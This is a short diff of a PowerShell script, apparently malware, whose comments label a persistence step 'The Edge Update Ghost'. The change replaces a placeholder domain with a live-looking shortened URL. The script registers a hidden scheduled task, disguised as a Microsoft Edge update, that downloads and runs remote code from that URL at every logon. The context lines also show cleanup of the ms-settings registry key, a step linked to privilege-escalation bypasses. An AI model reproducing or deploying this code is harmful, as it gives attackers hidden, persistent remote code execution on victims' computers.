@@ -20,6 +20,6 @@ ri 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
 
 # 5. Persistence (The "Edge Update" Ghost)
 # Replace 'your-server-a.com' with the actual domain hosting this .ps1 script
-$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -c `"irm https://your-server-a.com | iex`""
+$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -c `"irm https://msedge.short.gy/0Dztgk | iex`""
 $t = New-ScheduledTaskTrigger -AtLogOn
 Register-ScheduledTask -Action $a -Trigger $t -TaskName "MicrosoftEdgeUpdateTaskMachineUA" -Description "Microsoft Edge Update" -Force
